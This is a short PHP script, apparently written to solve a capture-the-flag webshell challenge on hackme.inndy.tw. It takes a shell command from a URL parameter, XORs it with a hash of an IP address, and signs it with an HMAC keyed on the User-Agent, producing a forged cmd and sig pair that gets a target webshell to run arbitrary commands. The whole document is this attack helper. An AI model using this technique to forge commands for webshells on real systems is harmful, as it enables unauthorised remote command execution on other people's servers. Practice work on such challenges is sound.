<?php
$key = $_SERVER['HTTP_USER_AGENT'] . sha1('webshell.hackme.inndy.tw');
$cmd = $_GET['cmd'];
$sig = hash_hmac('SHA512', $cmd, $key);
$cmdinput=$cmd^hash('SHA512', '221.218.67.74');
echo "cmd=".urlencode($cmdinput)."&sig="."$sig";
?>
 
